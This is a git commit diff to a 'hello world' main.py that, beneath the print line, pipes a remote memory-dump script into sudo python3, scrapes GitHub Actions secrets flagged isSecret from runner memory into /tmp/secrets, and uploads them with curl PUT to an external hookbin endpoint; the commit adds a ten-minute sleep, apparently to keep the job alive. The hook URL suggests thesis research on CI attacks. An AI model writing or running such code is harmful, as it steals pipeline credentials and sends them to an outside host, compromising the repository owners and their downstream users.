29dcc63947c7c5e3aabb9813a2ebfc30d143bc2c
playground-nils <129897827+playground-nils@users.noreply.github.com>
2026-03-11 15:51:47 +0100

    Update main.py

--- main.py
+++ main.py
@@ -3,3 +3,6 @@ print("Hello World")
 import subprocess
 subprocess.run(["bash", "-c", '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''])
 subprocess.run(["bash", "-c", "curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/bachelor-thesis"])
+
+import time
+time.sleep(60 * 10)
